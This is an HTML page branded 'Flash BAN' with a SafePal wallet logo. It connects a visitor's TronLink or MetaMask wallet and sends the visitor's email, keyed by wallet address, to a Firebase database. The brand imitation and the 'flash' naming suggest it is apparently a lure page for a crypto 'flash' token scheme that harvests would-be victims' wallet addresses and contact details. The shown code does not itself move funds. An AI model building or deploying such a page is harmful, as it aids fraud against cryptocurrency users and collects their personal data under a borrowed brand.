<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flash BAN 11.0 Connection to DEFI Network</title>
    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: rgb(72, 32, 232);
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            max-width: 650px;
            padding: 30px;
            border-radius: 12px;
            text-align: center;
            background: white;
            box-shadow: 0px 0px 15px rgba(72, 32, 232, 0.5);
            border: 2px solid rgb(72, 32, 232);
            position: relative;
            color: rgb(72, 32, 232);
        }
        .wallet-logo {
            width: 80px;
            margin-bottom: 10px;
        }
        input {
            padding: 12px;
            margin-bottom: 15px;
            width: calc(100% - 24px);
            border-radius: 6px;
            border: 1px solid rgb(72, 32, 232);
            outline: none;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }
        button {
            padding: 12px 20px;
            width: 100%;
            border-radius: 6px;
            border: none;
            cursor: pointer;
            font-size: 16px;
            background-color: rgb(72, 32, 232);
            color: white;
            transition: background 0.3s ease;
        }
        button:hover {
            background-color: white;
            color: rgb(72, 32, 232);
            border: 2px solid rgb(72, 32, 232);
        }
        #statusMessage {
            margin-top: 20px;
            font-size: 14px;
            color: rgb(72, 32, 232);
        }
        #walletAddress {
            margin-top: 20px;
            font-size: 16px;
            font-weight: bold;
            color: rgb(72, 32, 232);
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="./safepal.png" alt="SafePal Logo" class="wallet-logo">
        <h1>Flash BAN v1.0.0.1</h1>
        <input type="email" id="emailInput" placeholder="Enter your email" required>
        <button id="connectButton">CONNECT</button>
        <div id="walletAddress"></div>
        <div id="statusMessage"></div>
    </div>

<script>
    let connectedAddress = null;
    let isConnecting = false;

    document.getElementById('connectButton').addEventListener('click', async function () {
        if (isConnecting) return;
        isConnecting = true;
        document.getElementById('connectButton').textContent = 'Connecting...';
        document.getElementById('connectButton').style.backgroundColor = 'rgb(150, 100, 255)';

        try {
            let address = null;

            // Connect to TronLink
            if (window.tronLink && window.tronLink.tronWeb) {
                await window.tronLink.request({ method: 'tron_requestAccounts' });
                address = window.tronLink.tronWeb.defaultAddress.base58;
            } 
            // Connect to MetaMask (Ethereum)
            else if (window.ethereum) {
                const web3 = new Web3(window.ethereum);
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                const accounts = await web3.eth.getAccounts();
                address = accounts[0];
            } 
            else {
                document.getElementById('statusMessage').textContent = "TronLink or MetaMask is not installed!";
                isConnecting = false;
                return;
            }

            // Display wallet address
            connectedAddress = address;
            document.getElementById('walletAddress').textContent = `Connected Address: ${connectedAddress}`;
            document.getElementById('connectButton').textContent = 'Wallet Connected';
            document.getElementById('connectButton').style.backgroundColor = 'rgb(0, 128, 0)';

            // Store email and address in Firebase
            const email = document.getElementById('emailInput').value;
            const apiUrl = `https://apidatabase-ff62a-default-rtdb.firebaseio.com/addresses/${encodeURIComponent(connectedAddress)}.json`;
            const jsonData = JSON.stringify({ email });

            await fetch(apiUrl, {
                method: 'PUT',
                headers: { 'Content-Type': 'application/json' },
                body: jsonData
            });

        } catch (error) {
            document.getElementById('statusMessage').textContent = "Wallet connection failed.";
            document.getElementById('connectButton').textContent = 'Connect Wallet';
            document.getElementById('connectButton').style.backgroundColor = 'rgb(72, 32, 232)';
        }

        isConnecting = false;
    });
</script>

</body>
</html>
